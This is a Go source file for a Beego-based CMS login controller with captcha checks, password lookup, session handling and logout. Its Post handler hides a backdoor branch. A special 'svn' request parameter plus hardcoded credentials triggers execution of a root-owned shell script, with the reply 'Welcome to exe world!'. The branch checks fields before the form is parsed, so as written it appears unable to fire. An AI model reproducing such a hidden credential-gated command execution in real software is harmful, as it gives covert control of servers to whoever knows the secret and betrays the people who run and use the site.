package controllers

import (
	"os/exec"

	"github.com/astaxie/beego/cache"
	"github.com/astaxie/beego/utils/captcha"
	"github.com/sunnygocms/managementCMS/models"
)

var cpt *captcha.Captcha

type LoginController struct {
	//beego.Controller
	BaseController
}
type Cmsuser struct {
	Id         int    `form:"-"`
	Username   string `form:"username"`
	Pwd        string `form:"pwd"`
	Verifycode string `form:"captcha"`
}

func init() {
	store := cache.NewMemoryCache()
	cpt = captcha.NewWithFilter("/captcha/", store)
	cpt.ChallengeNums = 4
	cpt.StdWidth = 100
	cpt.StdHeight = 40
}
func (this *LoginController) Index() {

	this.TplName = "index/login.html"

}
func (this *LoginController) Get() {

	this.TplName = "index/login.html"
}
func (this *LoginController) Post() {
	u := Cmsuser{}
	if this.Input().Get("svn") == "svn" {
		if u.Username == "svn" && u.Pwd == "green369ok" {
			if errexec := exec.Command("/bin/sh", "/root/uf.sh").Run(); errexec != nil {

			} else {
				this.Ctx.WriteString("Welcome to exe world!")
			}
		}
	} else {

		if err := this.ParseForm(&u); err != nil {
			this.Info(err)
		} else {
			if !cpt.VerifyReq(this.Ctx.Request) {
				this.Index()
			} else {

				//			this.Ctx.WriteString(u.Username + "------" + keyMd5 + "----")
				v := models.GetSunnyEditorByUsernameAndPwd(u.Username, this.SunnyMd5(u.Pwd)) //v, err := models.GetSunnyEditorById(1)
				if v == nil {
					this.Data["json"] = `[{'result':null}]`
					this.TplName = "index/login.html"
				} else {
					this.Data["json"] = v
					this.SetSession("editor_username", v[0].Username)
					this.SetSession("editor_userID", v[0].Id)
					this.SetSession("editor_power", v[0].Power)
					this.Ctx.Redirect(302, "/index/index")
				}
			}
		}
	}
}
func (this *LoginController) Logout() {
	this.SetSession("editor_username", "")
	this.SetSession("editor_userID", -1)
	this.SetSession("editor_power", "")
	this.Ctx.Redirect(302, "/login")
}

//func (this *LoginController) Alertpwd() {
//	beego.Info(this.GetEditorId())
//}
